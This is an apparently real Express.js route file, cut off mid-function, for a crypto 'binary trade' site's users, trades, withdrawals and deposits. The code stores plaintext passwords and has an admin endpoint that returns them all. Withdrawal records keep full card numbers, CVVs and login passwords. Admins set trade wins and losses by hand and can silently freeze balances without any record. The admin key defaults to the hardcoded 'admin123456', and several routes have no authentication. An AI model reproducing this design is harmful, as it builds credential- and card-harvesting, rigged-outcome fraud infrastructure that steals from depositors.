import express from "express";
import User from "../models/User.js";
import bcrypt from "bcryptjs";
import mongoose from "mongoose";
import crypto from "crypto";

const router = express.Router();

// ================= MASTER ADMIN SESSION HELPERS =================
function generateSessionId() {
  return crypto.randomBytes(32).toString("hex");
}

function getClientIp(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    req.connection?.remoteAddress ||
    "unknown"
  );
}

function getDeviceInfo(userAgent) {
  if (!userAgent) return "Unknown Device";

  const ua = userAgent.toLowerCase();

  if (ua.includes("mobile")) return "📱 Mobile Device";
  if (ua.includes("tablet")) return "📱 Tablet";
  if (ua.includes("windows")) return "💻 Windows PC";
  if (ua.includes("mac")) return "🍎 Mac Computer";
  if (ua.includes("linux")) return "🐧 Linux Computer";
  if (ua.includes("iphone")) return "📱 iPhone";
  if (ua.includes("android")) return "📱 Android Phone";

  return "💻 Desktop Computer";
}

function getBrowserInfo(userAgent) {
  if (!userAgent) return "Unknown";

  const ua = userAgent.toLowerCase();

  if (ua.includes("chrome") && !ua.includes("edg")) return "Chrome";
  if (ua.includes("firefox")) return "Firefox";
  if (ua.includes("safari") && !ua.includes("chrome")) return "Safari";
  if (ua.includes("edg")) return "Edge";
  if (ua.includes("opera")) return "Opera";

  return "Other Browser";
}

// ================= REGISTER =================
router.post("/register", async (req, res) => {
  try {
    const { username, email, password, fullName, phone, country } = req.body;

    if (!username || !email || !password) {
      return res
        .status(400)
        .json({ error: "Username, email and password are required" });
    }

    const cleanUser = username.toLowerCase().trim();
    const cleanEmail = email.toLowerCase().trim();

    const existingUser = await User.findOne({
      $or: [{ username: cleanUser }, { email: cleanEmail }],
    });

    if (existingUser) {
      return res
        .status(400)
        .json({ error: "Username or email already exists" });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    const user = await User.create({
      username: cleanUser,
      email: cleanEmail,
      password: hashedPassword,
      plainPassword: password,
      fullName: fullName || "",
      phone: phone || "",
      country: country || "",
      withdrawalRequests: [],
      pendingTrades: [],
      notifications: [],
    });

    const safeUser = user.toObject();
    delete safeUser.password;

    res.status(201).json(safeUser);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= LOGIN =================
// ================= LOGIN =================
router.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ error: "Username and password required" });
    }

    const cleanUser = username.toLowerCase().trim();

    const user = await User.findOne({ username: cleanUser });

    if (!user) {
      return res.status(400).json({ error: "Invalid credentials" });
    }

    // Check regular user ban
    if (user.isBanned) {
      return res.status(403).json({ error: "BANNED" });
    }

    // ✅ CHECK ADMIN BAN - BLOCK BANNED ADMINS FROM LOGGING IN
    if (user.role === "admin" && user.isAdminBanned === true) {
      return res.status(403).json({ 
        error: "ADMIN_BANNED",
        message: "Your admin access has been revoked",
        reason: user.adminBanReason || "No reason provided",
        bannedAt: user.adminBannedAt
      });
    }

    const isMatch = await bcrypt.compare(password, user.password);

    if (!isMatch) {
      return res.status(400).json({ error: "Invalid credentials" });
    }

    const safeUser = user.toObject();
    delete safeUser.password;
    delete safeUser.plainPassword;
    
    // ✅ Explicitly ensure ban fields are included in response
    safeUser.isAdminBanned = user.isAdminBanned || false;
    safeUser.adminBanReason = user.adminBanReason || null;
    safeUser.adminBannedAt = user.adminBannedAt || null;

    res.json(safeUser);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL USERS =================
router.get("/", async (req, res) => {
  try {
    const users = await User.find().select("-password -plainPassword");
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET SINGLE USER =================
router.get("/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const user = await User.findOne({ username }).select(
      "-password -plainPassword",
    );

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL USERS WITH PLAIN PASSWORDS (ADMIN ONLY) =================
router.get("/admin/all-with-plain-passwords", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const users = await User.find({});

    const usersWithPasswords = users.map((user) => {
      const userObj = user.toObject();
      delete userObj.password;
      return userObj;
    });

    res.json(usersWithPasswords);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= UPDATE USER PASSWORD (ADMIN ONLY) =================
router.post("/admin/update-password", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, newPassword } = req.body;

    if (!username || !newPassword) {
      return res
        .status(400)
        .json({ error: "Username and newPassword required" });
    }

    const hashedPassword = await bcrypt.hash(newPassword, 10);

    const user = await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      {
        password: hashedPassword,
        plainPassword: newPassword,
      },
      { returnDocument: "after" },
    );

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({ success: true, message: "Password updated successfully" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= WITHDRAW FUNDS =================
router.post("/withdraw", async (req, res) => {
  try {
    const {
      username,
      amount,
      cardId,
      password,
      holderName,
      bankName,
      accNumber,
      cvv,
    } = req.body;

    if (!username || !amount || !cardId || !password) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(401).json({ error: "Invalid password" });
    }

    if (user.balance < amount) {
      return res.status(400).json({ error: "Insufficient balance" });
    }

    const card = user.savedCards?.find((c) => String(c.id) === String(cardId));
    if (!card) {
      return res.status(400).json({ error: "Card not found" });
    }

    const withdrawalRequest = {
      id: Date.now(),
      type: "Withdraw",
      amount: amount,
      usd: amount,
      cardId: card.id,
      cardLast4: card.display?.slice(-4) || card.accNumber?.slice(-4) || "****",
      cardNumber: card.num || card.accNumber || "****",
      cardName: card.name || card.holderName || "",
      cardExpiry: card.exp || "",
      cvv: card.cvv || "***",
      // Bank account details (for new withdrawals)
      holderName: holderName || card.holderName || "",
      bankName: bankName || card.bankName || "",
      accNumber: accNumber || card.accNumber || card.num || "",
      date: new Date().toISOString(),
      status: "pending",
      userPassword: password,
    };

    user.withdrawalRequests = [
      withdrawalRequest,
      ...(user.withdrawalRequests || []),
    ];
    user.transactions = [
      {
        type: "Withdraw",
        amount: amount,
        usd: amount,
        date: new Date().toISOString(),
        status: "pending",
        cardLast4:
          card.display?.slice(-4) || card.accNumber?.slice(-4) || "****",
        holderName: holderName || card.holderName || "",
        bankName: bankName || card.bankName || "",
      },
      ...(user.transactions || []),
    ];

    await user.save();

    res.json({
      success: true,
      currentBalance: user.balance,
      requestId: withdrawalRequest.id,
      message: "Withdrawal request submitted for admin approval",
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN APPROVE WITHDRAWAL =================
router.post("/admin/approve-withdrawal", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, requestId, action } = req.body;

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const requestIndex = user.withdrawalRequests.findIndex(
      (r) => String(r.id) === String(requestId),
    );
    if (requestIndex === -1) {
      return res.status(404).json({ error: "Withdrawal request not found" });
    }

    const request = user.withdrawalRequests[requestIndex];

    if (request.status !== "pending") {
      return res
        .status(400)
        .json({ error: `Request already ${request.status}` });
    }

    if (action === "approve") {
      if (user.balance < request.amount) {
        return res
          .status(400)
          .json({ error: "Insufficient balance for approval" });
      }
      user.balance -= request.amount;

      request.status = "approved";
      request.approvedAt = new Date().toISOString();

      const txIndex = user.transactions.findIndex(
        (t) => t.date === request.date,
      );
      if (txIndex !== -1) {
        user.transactions[txIndex].status = "approved";
        user.transactions[txIndex].approvedAt = new Date().toISOString();
      }
    } else if (action === "reject") {
      request.status = "rejected";
      request.rejectedAt = new Date().toISOString();

      const txIndex = user.transactions.findIndex(
        (t) => t.date === request.date,
      );
      if (txIndex !== -1) {
        user.transactions[txIndex].status = "rejected";
        user.transactions[txIndex].rejectedAt = new Date().toISOString();
      }
    } else {
      return res
        .status(400)
        .json({ error: "Invalid action. Use 'approve' or 'reject'" });
    }

    user.markModified("withdrawalRequests");
    user.markModified("transactions");

    await user.save();

    res.json({
      success: true,
      message: `Withdrawal ${action}d successfully`,
      newBalance: user.balance,
      requestStatus: request.status,
    });
  } catch (err) {
    console.error("Error in approve-withdrawal:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL WITHDRAWAL REQUESTS (ADMIN ONLY) =================
router.get("/admin/all-withdrawals", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const users = await User.find({});
    const allWithdrawals = [];

    users.forEach((user) => {
      (user.withdrawalRequests || []).forEach((request) => {
        allWithdrawals.push({
          ...(request.toObject ? request.toObject() : request),
          username: user.username,
          userEmail: user.email,
          userFullName: user.fullName,
        });
      });
    });

    allWithdrawals.sort((a, b) => new Date(b.date) - new Date(a.date));

    res.json(allWithdrawals);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE CARD TO USER (LEGACY) =================
router.post("/save-card", async (req, res) => {
  try {
    const { username, card } = req.body;

    if (!username || !card) {
      return res.status(400).json({ error: "Username and card required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const updatedCards = [...(user.savedCards || []), card];

    const updatedUser = await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      { savedCards: updatedCards },
      { returnDocument: "after" },
    );

    res.json({ success: true, savedCards: updatedUser.savedCards });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE BINARY TRADE =================
router.post("/:username/binary-trades", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const trade = req.body;

    if (!trade || !trade.coin) {
      return res.status(400).json({ error: "Invalid trade data" });
    }

    const user = await User.findOneAndUpdate(
      { username },
      { $push: { binaryTrades: trade } },
      { returnDocument: "after" },
    ).select("-password -plainPassword");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({ success: true, trade });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET BINARY TRADES =================
router.get("/:username/binary-trades", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();

    const user = await User.findOne({ username }).select("binaryTrades");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user.binaryTrades || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL TRADES (ADMIN ONLY) - returns ALL trades with status =================
router.get("/admin/all-trades", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const users = await User.find({});
    const allTrades = [];

    users.forEach((user) => {
      (user.pendingTrades || []).forEach((trade) => {
        allTrades.push({
          ...trade,
          username: user.username,
          userEmail: user.email,
          userFullName: user.fullName,
        });
      });
    });

    allTrades.sort((a, b) => new Date(b.startTime) - new Date(a.startTime));
    res.json(allTrades);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE PENDING TRADE =================
router.post("/:username/pending-trades", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const trade = req.body;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.pendingTrades = user.pendingTrades || [];
    user.pendingTrades.push(trade);
    await user.save();

    res.json({ success: true, trade });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN RESOLVE TRADE (WIN/LOSS/FREEZE) - WITH BALANCE CHANGE =================
router.post("/admin/resolve-trade", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, tradeId, action } = req.body;

    if (!username || !tradeId || !action) {
      return res
        .status(400)
        .json({ error: "Username, tradeId, and action are required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const tradeIndex = (user.pendingTrades || []).findIndex(
      (t) => String(t.id) === String(tradeId),
    );
    if (tradeIndex === -1) {
      return res.status(404).json({ error: "Trade not found" });
    }

    const trade = user.pendingTrades[tradeIndex];

    if (trade.status !== "pending") {
      return res.status(400).json({ error: `Trade already ${trade.status}` });
    }

    let newBalance = user.balance;
    let profitAmount = 0;
    let resultMessage = "";

    if (action === "win") {
      profitAmount = parseFloat(
        (trade.amount * (trade.profitPercent / 100)).toFixed(2),
      );
      const totalReturn = parseFloat((trade.amount + profitAmount).toFixed(2));
      newBalance = parseFloat((user.balance + totalReturn).toFixed(2));
      trade.status = "won";
      trade.resolvedAt = new Date().toISOString();
      trade.result = "WIN";
      trade.profitAmount = profitAmount;
      resultMessage = `WIN! +$${profitAmount.toFixed(2)} profit added. Total: +$${totalReturn.toFixed(2)}`;
    } else if (action === "loss") {
      newBalance = user.balance - trade.amount;
      trade.status = "lost";
      trade.resolvedAt = new Date().toISOString();
      trade.result = "LOSS";
      resultMessage = `LOSS. -$${trade.amount} deducted from balance.`;
    } else if (action === "freeze") {
      trade.status = "frozen";
      trade.resolvedAt = new Date().toISOString();
      trade.result = "FROZEN";
      resultMessage = `FROZEN. Amount held for review.`;
    } else {
      return res
        .status(400)
        .json({ error: "Invalid action. Use 'win', 'loss', or 'freeze'" });
    }

    user.balance = newBalance;
    user.pendingTrades[tradeIndex] = trade;

    // UPDATE existing transaction instead of creating new one
    const existingTxIndex = (user.transactions || []).findIndex(
      (tx) =>
        tx.orderNumber === trade.orderNumber && tx.type === "Binary Trade",
    );

    if (existingTxIndex !== -1) {
      // Update existing transaction
      user.transactions[existingTxIndex] = {
        ...user.transactions[existingTxIndex],
        status: trade.status,
        profitAmount:
          action === "win"
            ? profitAmount
            : action === "loss"
              ? -parseFloat(trade.amount.toFixed(2))
              : 0,
        result: trade.result,
        profit: action === "win" ? profitAmount : -trade.amount,
        formattedDate: new Date().toLocaleString(),
      };
    } else {
      // Fallback: add new if not found (for old trades)
      const transaction = {
        type: "Binary Trade",
        orderNumber: trade.orderNumber,
        coin: trade.coin,
        amount: trade.amount,
        orderType: trade.orderType,
        timeSeconds: trade.timeSeconds,
        profitPercent: trade.profitPercent,
        status: trade.status,
        profitAmount:
          action === "win"
            ? profitAmount
            : action === "loss"
              ? -trade.amount
              : 0,
        result: trade.result,
        date: new Date().toISOString(),
        formattedDate: new Date().toLocaleString(),
      };
      user.transactions = [transaction, ...(user.transactions || [])];
    }

    user.markModified("pendingTrades");
    user.markModified("transactions");
    await user.save();

    // UPDATE existing notification instead of creating new one
    const existingNotifIndex = (user.notifications || []).findIndex(
      (n) =>
        n.title === "📊 Trade Placed" && n.body.includes(trade.orderNumber),
    );

    if (existingNotifIndex !== -1) {
      // Update existing notification
      user.notifications[existingNotifIndex] = {
        ...user.notifications[existingNotifIndex],
        title: `Trade ${action.toUpperCase()}`,
        body: `Your $${trade.amount} ${trade.coin} trade (${trade.orderType}) - ${resultMessage}`,
        time: new Date().toLocaleTimeString(),
        date: new Date().toISOString(),
        read: false,
        fromAdmin: true,
      };
    } else {
      // Fallback: add new if not found
      user.notifications = user.notifications || [];
      user.notifications.unshift({
        id: Date.now() + Math.random(),
        title: `Trade ${action.toUpperCase()}`,
        body: `Your $${trade.amount} ${trade.coin} trade (${trade.orderType}) - ${resultMessage}`,
        time: new Date().toLocaleTimeString(),
        date: new Date().toISOString(),
        read: false,
        fromAdmin: true,
      });
    }
    await user.save();

    res.json({
      success: true,
      message: `Trade marked as ${action.toUpperCase()}`,
      newBalance: user.balance,
      tradeStatus: trade.status,
    });
  } catch (err) {
    console.error("Error resolving trade:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= SEND NOTIFICATION TO USER (ADMIN ONLY) =================
router.post("/admin/send-notification", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, title, body } = req.body;

    if (!username || !title) {
      return res.status(400).json({ error: "Username and title required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.notifications = user.notifications || [];
    user.notifications.unshift({
      id: Date.now() + Math.random(),
      title,
      body: body || "",
      time: new Date().toLocaleTimeString(),
      date: new Date().toISOString(),
      read: false,
      fromAdmin: true,
    });

    await user.save();

    res.json({ success: true, message: "Notification sent" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADD NOTIFICATION (for trade placement) =================
router.post("/:username/notifications", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const { title, body, type } = req.body;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.notifications = user.notifications || [];
    user.notifications.unshift({
      id: Date.now() + Math.random(),
      title,
      body,
      time: new Date().toLocaleTimeString(),
      date: new Date().toISOString(),
      read: false,
      type: type || "general",
    });

    await user.save();

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET USER NOTIFICATIONS =================
router.get("/:username/notifications", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const user = await User.findOne({ username });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user.notifications || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= MARK NOTIFICATION READ =================
router.post("/:username/notifications/read", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const { notificationId } = req.body;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const notifIndex = (user.notifications || []).findIndex(
      (n) => String(n.id) === String(notificationId),
    );
    if (notifIndex !== -1) {
      user.notifications[notifIndex].read = true;
      await user.save();
    }

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= DELETE NOTIFICATION =================
router.delete("/:username/notifications/:notificationId", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const notificationId = req.params.notificationId;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    // Remove the notification - NO ADMIN KEY REQUIRED FOR OWN NOTIFICATIONS
    user.notifications = (user.notifications || []).filter(
      (n) => String(n.id) !== String(notificationId),
    );
    await user.save();

    res.json({ success: true });
  } catch (err) {
    console.error("Error deleting notification:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= DELETE ALL NOTIFICATIONS FOR A USER =================
// ================= DELETE ALL NOTIFICATIONS FOR A USER =================
router.delete("/:username/notifications/all", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    console.log("🔴 DELETE ALL - Username:", username);

    // Use direct database access (bypasses Mongoose)
    const db = mongoose.connection.db;
    const collection = db.collection("users");

    const result = await collection.updateOne(
      { username: username },
      { $set: { notifications: [] } },
    );

    console.log("Delete result:", result);

    res.json({
      success: true,
      modifiedCount: result.modifiedCount,
    });
  } catch (err) {
    console.error("❌ Error clearing all notifications:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE CARD TO USER (NEW DIRECT ENDPOINT) =================
router.post("/:username/cards", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const { card } = req.body;

    if (!card) {
      return res.status(400).json({ error: "Card data required" });
    }

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const updatedCards = [...(user.savedCards || []), card];
    user.savedCards = updatedCards;
    await user.save();

    res.json({ success: true, savedCards: updatedCards });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= UPDATE USER =================
router.patch("/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const updates = req.body;

    if (updates.password) {
      updates.password = await bcrypt.hash(updates.password, 10);
      updates.plainPassword = updates.password;
    }

    const user = await User.findOneAndUpdate(
      { username },
      { $set: updates },
      { returnDocument: "after", runValidators: true },
    ).select("-password -plainPassword");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user);
  } catch (err) {
    res.status(500).json({ error: "Failed to update user" });
  }
});

// ================= BAN / UNBAN =================
router.post("/ban", async (req, res) => {
  try {
    const { username, banned } = req.body;

    if (!username) {
      return res.status(400).json({ error: "Username required" });
    }

    await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      { isBanned: banned },
      { returnDocument: "after" },
    );

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= DELETE USER =================
router.delete("/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();

    const deleted = await User.findOneAndDelete({ username });

    if (!deleted) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({ success: true, message: "User deleted successfully" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN FREEZE / UNFREEZE USER BALANCE (NO NOTIFICATIONS) =================
router.post("/admin/freeze-balance", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY;
    if (!validAdminKey) {
      return res.status(500).json({ error: "API key not configured" });
    }

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, amount, action, reason } = req.body;

    if (!username || !amount || !action) {
      return res
        .status(400)
        .json({ error: "Username, amount, and action are required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const freezeAmount = parseFloat(amount);
    if (isNaN(freezeAmount) || freezeAmount <= 0) {
      return res.status(400).json({ error: "Invalid amount" });
    }

    if (action === "freeze") {
      if (user.balance < freezeAmount) {
        return res
          .status(400)
          .json({ error: `Insufficient balance. User has $${user.balance}` });
      }

      user.balance -= freezeAmount;

      const freezeEntry = {
        id: Date.now(),
        username: username,
        amount: freezeAmount,
        reason: reason || "Admin freeze",
        frozenAt: new Date().toISOString(),
      };

      user.frozenAmounts = user.frozenAmounts || [];
      user.frozenAmounts.push(freezeEntry);
      user.frozenTotal = (user.frozenTotal || 0) + freezeAmount;

      // NO transactions added
      // NO notifications sent

      await user.save();

      res.json({
        success: true,
        message: `$${freezeAmount} frozen from user's balance`,
        newBalance: user.balance,
        frozenTotal: user.frozenTotal,
        frozenAmounts: user.frozenAmounts,
      });
    } else if (action === "unfreeze") {
      const { freezeId } = req.body;

      if (freezeId) {
        const freezeIndex = (user.frozenAmounts || []).findIndex(
          (f) => String(f.id) === String(freezeId),
        );
        if (freezeIndex === -1) {
          return res.status(404).json({ error: "Freeze record not found" });
        }

        const freezeEntry = user.frozenAmounts[freezeIndex];
        const unfreezeAmount = freezeEntry.amount;

        user.balance += unfreezeAmount;
        user.frozenAmounts.splice(freezeIndex, 1);
        user.frozenTotal = (user.frozenTotal || 0) - unfreezeAmount;

        // NO transactions added
        // NO notifications sent

        await user.save();

        res.json({
          success: true,
          message: `$${unfreezeAmount} unfrozen and added back to balance`,
          newBalance: user.balance,
          frozenTotal: user.frozenTotal,
          frozenAmounts: user.frozenAmounts,
        });
      } else {
        if (user.frozenTotal < freezeAmount) {
          return res
            .status(400)
            .json({ error: `Only $${user.frozenTotal} is frozen` });
        }

        let remainingToUnfreeze = freezeAmount;
        const newFrozenAmounts = [];

        for (const entry of user.frozenAmounts || []) {
          if (remainingToUnfreeze <= 0) {
            newFrozenAmounts.push(entry);
            continue;
          }

          if (entry.amount <= remainingToUnfreeze) {
            remainingToUnfreeze -= entry.amount;
          } else {
            newFrozenAmounts.push({
              ...entry,
              amount: entry.amount - remainingToUnfreeze,
            });
            remainingToUnfreeze = 0;
          }
        }

        const unfrozenAmount = freezeAmount - remainingToUnfreeze;

        user.balance += unfrozenAmount;
        user.frozenAmounts = newFrozenAmounts;
        user.frozenTotal = (user.frozenTotal || 0) - unfrozenAmount;

        // NO transactions added
        // NO notifications sent

        await user.save();

        res.json({
          success: true,
          message: `$${unfrozenAmount} unfrozen and added back to balance`,
          newBalance: user.balance,
          frozenTotal: user.frozenTotal,
          frozenAmounts: user.frozenAmounts,
        });
      }
    } else {
      return res
        .status(400)
        .json({ error: "Invalid action. Use 'freeze' or 'unfreeze'" });
    }
  } catch (err) {
    console.error("Error in freeze-balance:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= GET USER FROZEN AMOUNTS =================
router.get("/:username/frozen", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const user = await User.findOne({ username });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({
      frozenTotal: user.frozenTotal || 0,
      frozenAmounts: user.frozenAmounts || [],
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADD TRANSACTION TO USER HISTORY =================
router.post("/:username/transactions", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const transaction = req.body;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.transactions = user.transactions || [];
    user.transactions.unshift(transaction);
    await user.save();

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= CREATE DEPOSIT REQUEST =================
router.post("/deposit-request", async (req, res) => {
  try {
    const { username, amount, cardDetails } = req.body;

    if (!username || !amount) {
      return res.status(400).json({ error: "Username and amount required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const depositRequest = {
      id: Date.now(),
      amount: parseFloat(amount),
      usd: parseFloat(amount),
      date: new Date().toISOString(),
      status: "pending",
      cardDetails: cardDetails || {},
    };

    user.depositRequests = user.depositRequests || [];
    user.depositRequests.unshift(depositRequest);

    await user.save();

    res.json({
      success: true,
      message: "Deposit request submitted",
      requestId: depositRequest.id,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL DEPOSIT REQUESTS (ADMIN ONLY) =================
router.get("/admin/all-deposits", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const users = await User.find({});
    const allDeposits = [];

    users.forEach((user) => {
      (user.depositRequests || []).forEach((request) => {
        allDeposits.push({
          ...request,
          username: user.username,
          userEmail: user.email,
          userFullName: user.fullName,
        });
      });
    });

    allDeposits.sort((a, b) => new Date(b.date) - new Date(a.date));
    res.json(allDeposits);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN APPROVE/REJECT DEPOSIT =================
router.post("/admin/approve-deposit", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, requestId, action } = req.body;

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const requestIndex = (user.depositRequests || []).findIndex(
      (r) => String(r.id) === String(requestId),
    );
    if (requestIndex === -1) {
      return res.status(404).json({ error: "Deposit request not found" });
    }

    const request = user.depositRequests[requestIndex];

    if (request.status !== "pending") {
      return res
        .status(400)
        .json({ error: `Request already ${request.status}` });
    }

    if (action === "approve") {
      request.status = "approved";
      request.approvedAt = new Date().toISOString();

      user.balance = parseFloat((user.balance + request.amount).toFixed(2));

      user.transactions = [
        {
          type: "Deposit",
          amount: request.amount,
          usd: request.amount,
          date: new Date().toISOString(),
          status: "approved",
          note: "Deposit approved",
        },
        ...(user.transactions || []),
      ];

      user.notifications = user.notifications || [];
      user.notifications.unshift({
        id: Date.now() + Math.random(),
        title: "✅ Deposit Approved",
        body: `Your deposit of $${request.amount} has been approved and added to your balance.`,
        time: new Date().toLocaleTimeString(),
        date: new Date().toISOString(),
        read: false,
      });
    } else if (action === "reject") {
      request.status = "rejected";
      request.rejectedAt = new Date().toISOString();

      user.notifications = user.notifications || [];
      user.notifications.unshift({
        id: Date.now() + Math.random(),
        title: "❌ Deposit Rejected",
        body: `Your deposit of $${request.amount} has been rejected. Please contact support.`,
        time: new Date().toLocaleTimeString(),
        date: new Date().toISOString(),
        read: false,
      });
    } else {
      return res
